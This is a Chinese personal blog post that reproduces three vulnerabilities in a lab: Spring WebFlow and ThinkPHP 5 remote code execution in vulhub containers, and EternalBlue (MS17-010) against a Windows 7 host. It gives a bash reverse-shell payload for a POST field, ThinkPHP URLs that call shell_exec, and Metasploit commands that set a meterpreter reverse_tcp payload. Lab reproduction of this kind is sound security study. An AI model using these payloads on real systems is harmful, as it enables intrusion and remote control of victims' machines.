@@ -1,0 +1,1118 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="han个人博客">
+    <title>代码执行及永恒之蓝漏洞复现 - han个人博客</title>
+    <meta name="author" content="han">
+    
+    
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: 复现代码执行漏洞，并用  metasploit 对 ms17_010 漏洞利用。\n\n\n\n\n\n\n代码执行漏洞实验环境：\n\nvulhub\nSpring WebFlow\n\n部署环境安装 docker 和 docker-compose\n12345# 安装 dockercurl -s https://get.docker.com/ | sh # 安装 docker-composecurl -s https://bootstrap.pypa.io/get-pip.py | pythonpip install docker-compose\n\ndocker 安装后只能启动 client，无法启动 server。解决方法如下：\n1234wget  https://get.docker.com/gpgrpmkeys --import ./gpgsystemctl start docker.servicedocker version\n\n下载环境\n1git clone https://github.com/vulhub/vulhub.git\n\n启动，进入 vulhub 目录，比如本例中 vulhub/spring/CVE-2017-4927。\n12# 环境启动后，访问 http://your-ip:8080docker-compose up -d\n\n漏洞复现首先访问登录页面，用左边给的账号和密码登录系统。\n\n图1 登录首页\n访问 `http://your-ip:8080/hotels/1` ，点击“Book Hotel”，填写信息后，点击\"Process\"，这一步开始抓包。\n\n\n图2 点击订阅\n![](/images/127spring4.png)\n\n图3 填写信息\n提交前打开\"Burp\"抓包。\n\n\n图4 添加数据包后的相应\n抓包后，在POST数据包中，添加一个字段：\n\n1_(new java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1\")).start()=vulhub\n\n\n图5 URL编码\n注意：URL编码\n\n1_(new+java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash+-i +&gt;%26+/dev/tcp/192.168.100.52/21+0&gt;%261\")).start()=vulhub\n\n成功执行。\nthinkphp 远程代码执行漏洞12cd vulhub/thinkphp/5-rcedocker-compose up -d\n\n环境启动后，访问 http://your-ip:8080 即可看到ThinkPHP默认启动页面。\n\n图6 ThinkPHP默认启动页面\n#### 漏洞复现\n\n直接访问\n1http://192.168.100.52:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1\n\n\n图7 执行phpinfo()\n直接访问\n\n1http://192.168.100.52:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=id\n\n\n图8  访问结果\n### 永恒之蓝漏洞复现与利用\n\n实验环境攻击机：\n\nKali Linux\nIP 地址：192.168.100.63\n工具：\nMetasploit\nnmap\n\n\n\n靶机：\n\nWindows 7 sp1 x64\nIP 地址：192.168.100.119\n\n扫描检测先用 namp 对靶机进行端口扫描。\n1namp -sS -O 192.168.100.119\n\n结果如下图1所示：\n\n图9 nmap扫描结果\n初步判断可以使用 `Ms17_010` 漏洞。\n\n启动 Metasploit1msfconsole #启动软件\n\n\n图10 msf启动界面\n123456# 切换目录msf &gt; use auxiliary/scanner/smb/smb_ms17_010# 设置靶机IP地址msf auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.100.119# 开始运行msf auxiliary(scanner/smb/smb_ms17_010) &gt; exploit\n\n\n图11 运行结果\n由图3可知，靶机确实存在 `Ms17_010` 漏洞。\n\n漏洞利用12345678910111213# 切换目录msf &gt; use exploit/windows/smb/ms17_010_eternalblue # 设置靶机IPmsf exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 192.168.100.119rhost =&gt; 192.168.100.119# 设置本地IPmsf exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 192.168.100.63lhost =&gt; 192.168.100.63# 设置payloadmsf exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(windows/smb/ms17_010_eternalblue) &gt;\n\n\n图12 基础设置\n1msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit\n\n\n图13 成功获取 session\n获取 shell 权限。\n\n\n图14 执行命令","dateCreated":"2019-09-23T17:38:28+08:00","dateModified":"2019-09-23T22:29:10+08:00","datePublished":"2019-09-23T17:38:28+08:00","description":"Abstract: 复现代码执行漏洞，并用  metasploit 对 ms17_010 漏洞利用。","headline":"代码执行及永恒之蓝漏洞复现","image":["https://images.unsplash.com/photo-1568021735466-efd8a4c435af?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1189&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/","keywords":"漏洞复现","thumbnailUrl":"https://images.unsplash.com/photo-1568021735466-efd8a4c435af?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1189&q=80"}</script>
+    <meta name="description" content="Abstract: 复现代码执行漏洞，并用  metasploit 对 ms17_010 漏洞利用。">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="代码执行及永恒之蓝漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/index.html">
+<meta property="og:site_name" content="han个人博客">
+<meta property="og:description" content="Abstract: 复现代码执行漏洞，并用  metasploit 对 ms17_010 漏洞利用。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/images/127spring1.png">
+<meta property="og:image" content="http://yoursite.com/images/127spring3.png">
+<meta property="og:image" content="http://yoursite.com/images/127spring4.png">
+<meta property="og:image" content="http://yoursite.com/images/127spring5.png">
+<meta property="og:image" content="http://yoursite.com/images/127think1.png">
+<meta property="og:image" content="http://yoursite.com/images/127think2.png">
+<meta property="og:image" content="http://yoursite.com/images/127think3.png">
+<meta property="og:image" content="http://yoursite.com/images/127blue1.png">
+<meta property="og:image" content="http://yoursite.com/images/127blue2.png">
+<meta property="og:image" content="http://yoursite.com/images/127blue3.png">
+<meta property="og:image" content="http://yoursite.com/images/127blue4.png">
+<meta property="og:image" content="http://yoursite.com/images/127blue5.png">
+<meta property="og:image" content="http://yoursite.com/images/127blue6.png">
+<meta property="og:updated_time" content="2019-09-23T14:29:10.563Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="代码执行及永恒之蓝漏洞复现">
+<meta name="twitter:description" content="Abstract: 复现代码执行漏洞，并用  metasploit 对 ms17_010 漏洞利用。">
+<meta name="twitter:image" content="http://yoursite.com/images/127spring1.png">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="http://yoursite.com/assets/images/headimg.jpg"/>
+    
+    
+        <meta property="og:image" content="https://images.unsplash.com/photo-1568021735466-efd8a4c435af?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1189&amp;q=80"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://images.unsplash.com/photo-1568021735466-efd8a4c435af?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1189&amp;q=80"/>
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-apbcs1por3ly2xr25bjnwqewpfn9wrdfbucv3jdunxv2vrrgeivtgtwgojwn.min.css">
+    <!--STYLES END-->
+    
+
+    
+
+    
+        
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/ "
+            aria-label=""
+        >
+            han个人博客
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="Open the link: /#about"
+            >
+        
+        
+            <img class="header-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a
+                    href="/#about"
+                    aria-label="Read more about the author"
+                >
+                    <img class="sidebar-profile-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">han</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>life and code</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="Home"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                            title="Categories"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="Tags"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="Archives"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link open-algolia-search"
+                             href="#search"
+                            
+                            title="Search"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="#about"
+                            
+                            title="About"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://github.com/" target="_blank" rel="noopener" title="GitHub">
+                    
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="http://stackoverflow.com/users" target="_blank" rel="noopener" title="Stack Overflow">
+                    
+                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Stack Overflow</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/mailto"
+                            title="Mail"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/atom.xml"
+                            
+                            title="RSS"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="5"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            代码执行及永恒之蓝漏洞复现
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2019-09-23T17:38:28+08:00">
+	
+		    Sep 23, 2019
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/Web-Security/">Web Security</a>, <a class="category-link" href="/categories/Web-Security/笔记/">笔记</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p><strong>Abstract</strong>: 复现代码执行漏洞，并用  <code>metasploit</code> 对 <code>ms17_010</code> 漏洞利用。</p>
+<a id="more"></a>
+
+<!--export-->
+
+<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码执行漏洞"><span class="toc-text">代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#部署环境"><span class="toc-text">部署环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#thinkphp-远程代码执行漏洞"><span class="toc-text">thinkphp 远程代码执行漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实验环境"><span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扫描检测"><span class="toc-text">扫描检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#启动-Metasploit"><span class="toc-text">启动 Metasploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a></li></ol></li></ol>
+
+<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p><strong>实验环境</strong>：</p>
+<ul>
+<li>vulhub</li>
+<li>Spring WebFlow</li>
+</ul>
+<h4 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h4><p>安装 docker 和 docker-compose</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 docker</span></span><br><span class="line">curl -s https://get.docker.com/ | sh </span><br><span class="line"><span class="comment"># 安装 docker-compose</span></span><br><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python</span><br><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure>
+
+<p>docker 安装后只能启动 client，无法启动 server。解决方法如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget  https://get.docker.com/gpg</span><br><span class="line">rpmkeys --import ./gpg</span><br><span class="line">systemctl start docker.service</span><br><span class="line">docker version</span><br></pre></td></tr></table></figure>
+
+<p>下载环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
+
+<p>启动，进入 vulhub 目录，比如本例中 <code>vulhub/spring/CVE-2017-4927</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 环境启动后，访问 http://your-ip:8080</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>首先访问登录页面，用左边给的账号和密码登录系统。</p>
+<p><img src="/images/127spring1.png" alt></p>
+<center>图1 登录首页</center>
+访问 `http://your-ip:8080/hotels/1` ，点击“Book Hotel”，填写信息后，点击"Process"，这一步开始抓包。
+
+<p><img src="/images/127spring3.png" alt></p>
+<center>图2 点击订阅</center>
+![](/images/127spring4.png)
+
+<center>图3 填写信息</center>
+提交前打开"Burp"抓包。
+
+<p><img src="/images/127spring4.png" alt></p>
+<center>图4 添加数据包后的相应</center>
+抓包后，在POST数据包中，添加一个字段：
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(<span class="string">"bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1"</span>)).start()=vulhub</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/127spring5.png" alt></p>
+<center>图5 URL编码</center>
+注意：URL编码
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_(new+java.lang.ProcessBuilder(<span class="string">"bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash+-i +&gt;%26+/dev/tcp/192.168.100.52/21+0&gt;%261"</span>)).start()=vulhub</span><br></pre></td></tr></table></figure>
+
+<p>成功执行。</p>
+<h4 id="thinkphp-远程代码执行漏洞"><a href="#thinkphp-远程代码执行漏洞" class="headerlink" title="thinkphp 远程代码执行漏洞"></a>thinkphp 远程代码执行漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/thinkphp/5-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>环境启动后，访问 <code>http://your-ip:8080</code> 即可看到ThinkPHP默认启动页面。</p>
+<p><img src="/images/127think1.png" alt></p>
+<center>图6 ThinkPHP默认启动页面</center>
+#### 漏洞复现
+
+<p>直接访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52:8080/index.php?s=/Index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/127think2.png" alt></p>
+<center>图7 执行phpinfo()</center>
+直接访问
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.52:8080/index.php?s=/Index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/127think3.png" alt></p>
+<center>图8  访问结果</center>
+### 永恒之蓝漏洞复现与利用
+
+<h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p><strong>攻击机</strong>：</p>
+<ul>
+<li>Kali Linux</li>
+<li>IP 地址：192.168.100.63</li>
+<li>工具：<ul>
+<li>Metasploit</li>
+<li>nmap</li>
+</ul>
+</li>
+</ul>
+<p><strong>靶机</strong>：</p>
+<ul>
+<li>Windows 7 sp1 x64</li>
+<li>IP 地址：192.168.100.119</li>
+</ul>
+<h4 id="扫描检测"><a href="#扫描检测" class="headerlink" title="扫描检测"></a>扫描检测</h4><p>先用 <code>namp</code> 对靶机进行端口扫描。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sS -O 192.168.100.119</span><br></pre></td></tr></table></figure>
+
+<p>结果如下图1所示：</p>
+<p><img src="/images/127blue1.png" alt="图1 nmap扫描结果"></p>
+<center>图9 nmap扫描结果</center>
+初步判断可以使用 `Ms17_010` 漏洞。
+
+<h4 id="启动-Metasploit"><a href="#启动-Metasploit" class="headerlink" title="启动 Metasploit"></a>启动 Metasploit</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole <span class="comment">#启动软件</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/127blue2.png" alt></p>
+<center>图10 msf启动界面</center>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换目录</span></span><br><span class="line">msf &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="comment"># 设置靶机IP地址</span></span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> rhosts 192.168.100.119</span><br><span class="line"><span class="comment"># 开始运行</span></span><br><span class="line">msf auxiliary(scanner/smb/smb_ms17_010) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/127blue3.png" alt></p>
+<center>图11 运行结果</center>
+由图3可知，靶机确实存在 `Ms17_010` 漏洞。
+
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换目录</span></span><br><span class="line">msf &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line"><span class="comment"># 设置靶机IP</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> rhost 192.168.100.119</span><br><span class="line">rhost =&gt; 192.168.100.119</span><br><span class="line"><span class="comment"># 设置本地IP</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> lhost 192.168.100.63</span><br><span class="line">lhost =&gt; 192.168.100.63</span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/127blue4.png" alt></p>
+<center>图12 基础设置</center>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/127blue5.png" alt></p>
+<center>图13 成功获取 session</center>
+获取 shell 权限。
+
+<p><img src="/images/127blue6.png" alt></p>
+<center>图14 执行命令</center>
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/漏洞复现/">漏洞复现</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/23/welcome/"
+                    data-tooltip="Welcome"
+                    aria-label="PREVIOUS: Welcome"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/21/获取网站flag/"
+                    data-tooltip="获取网站flag"
+                    aria-label="NEXT: 获取网站flag"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2019 han. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/23/welcome/"
+                    data-tooltip="Welcome"
+                    aria-label="PREVIOUS: Welcome"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/21/获取网站flag/"
+                    data-tooltip="获取网站flag"
+                    aria-label="NEXT: 获取网站flag"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/"
+                        aria-label="Share on Twitter"
+                    >
